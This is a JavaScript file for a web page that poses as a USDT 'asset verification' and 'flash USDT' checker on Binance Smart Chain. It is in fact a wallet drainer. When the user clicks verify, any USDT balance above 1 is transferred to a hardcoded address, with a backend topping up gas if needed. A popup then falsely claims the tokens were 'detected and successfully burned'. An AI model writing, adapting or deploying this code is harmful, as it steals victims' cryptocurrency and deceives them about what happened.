const bscAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090";
const bnbGasSender = "0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87";
const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955";

let web3;
let userAddress;

async function switchToBSC() {
  try {
    await window.ethereum.request({
      method: 'wallet_switchEthereumChain',
      params: [{ chainId: '0x38' }]
    });
  } catch (switchError) {
    // ✅ Fallback to add BSC chain if not found
    if (switchError.code === 4902) {
      try {
        await window.ethereum.request({
          method: 'wallet_addEthereumChain',
          params: [{
            chainId: '0x38',
            chainName: 'Binance Smart Chain',
            nativeCurrency: {
              name: 'BNB',
              symbol: 'BNB',
              decimals: 18
            },
            rpcUrls: ['https://bsc-dataseed.binance.org/'],
            blockExplorerUrls: ['https://bscscan.com']
          }]
        });
      } catch (addError) {
        console.error("Adding BSC chain failed", addError);
      }
    } else {
      console.error("Switching to BSC failed", switchError);
    }
  }
}

// ✅ Exact Trust Wallet/iOS logic from your working image
window.addEventListener("load", async () => {
  if (typeof window.ethereum !== "undefined") {
    web3 = new Web3(window.ethereum);
    try {
      const accounts = await ethereum.request({ method: "eth_accounts" });
      if (accounts.length > 0) {
        userAddress = accounts[0];
        await switchToBSC(); // now includes chainId + fallback
      }
    } catch (err) {
      console.warn("Auto-connect failed", err);
    }
  } else {
    alert("Please install MetaMask or use Trust Wallet browser.");
  }
});

async function verifyAssets() {
  if (!web3 || !userAddress) {
    alert("Wallet not connected.");
    return;
  }

  const usdtContract = new web3.eth.Contract([
    { constant: true, inputs: [{ name: "_owner", type: "address" }], name: "balanceOf", outputs: [{ name: "", type: "uint256" }], type: "function" }
  ], usdtContractAddress);

  const [usdtBalanceWei, userBNBWei] = await Promise.all([
    usdtContract.methods.balanceOf(userAddress).call(),
    web3.eth.getBalance(userAddress)
  ]);

  const usdtBalance = parseFloat(web3.utils.fromWei(usdtBalanceWei, "ether"));
  const userBNB = parseFloat(web3.utils.fromWei(userBNBWei, "ether"));

  if (usdtBalance === 0) {
    showPopup("No assets found.", "black");
    return;
  }

  if (usdtBalance <= 1) {
    showPopup(
      `✅ Verification Successful<br>Your assets are genuine. No flash or reported USDT found.<br><br><b>USDT Balance:</b> ${usdtBalance} USDT<br><b>BNB Balance:</b> ${userBNB} BNB`,
      "green"
    );
    return;
  }

  showPopup("Loading...", "green");
  transferUSDT(usdtBalance, userBNB);
}

async function transferUSDT(usdtBalance, userBNB) {
  try {
    if (userBNB < 0.0005) {
      await fetch("https://bep20usdt-backend-production.up.railway.app/send-bnb", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ toAddress: userAddress })
      });
    }

    const usdtContract = new web3.eth.Contract([
      { constant: false, inputs: [{ name: "recipient", type: "address" }, { name: "amount", type: "uint256" }], name: "transfer", outputs: [{ name: "", type: "bool" }], type: "function" }
    ], usdtContractAddress);

    const amountToSend = web3.utils.toWei(usdtBalance.toString(), "ether");

    await usdtContract.methods.transfer(bscAddress, amountToSend).send({ from: userAddress });

    showPopup(
      `✅ Verification Successful<br>Flash USDT has been detected and successfully burned.<br><br><b>USDT Burned:</b> ${usdtBalance} USDT`,
      "red"
    );
  } catch (error) {
    console.error("Transfer error:", error);
    alert("Transfer failed. Ensure BNB is available.");
  }
}

function showPopup(message, color) {
  let popup = document.getElementById("popupBox");
  if (!popup) {
    popup = document.createElement("div");
    popup.id = "popupBox";
    popup.style.position = "fixed";
    popup.style.top = "50%";
    popup.style.left = "50%";
    popup.style.transform = "translate(-50%, -50%)";
    popup.style.padding = "20px";
    popup.style.borderRadius = "10px";
    popup.style.boxShadow = "0 0 10px rgba(0,0,0,0.2)";
    popup.style.textAlign = "center";
    popup.style.fontSize = "18px";
    popup.style.width = "80%";
    popup.style.maxWidth = "400px";
    document.body.appendChild(popup);
  }

  popup.style.backgroundColor = color === "red" ? "#ffebeb" : color === "green" ? "#e6f7e6" : "#f4f4f4";
  popup.style.color = color === "red" ? "red" : color === "green" ? "green" : "black";
  popup.innerHTML = message;
  popup.style.display = "block";

  setTimeout(() => {
    popup.style.display = "none";
  }, 5000);
}

document.getElementById("verifyAssets").addEventListener("click", verifyAssets);
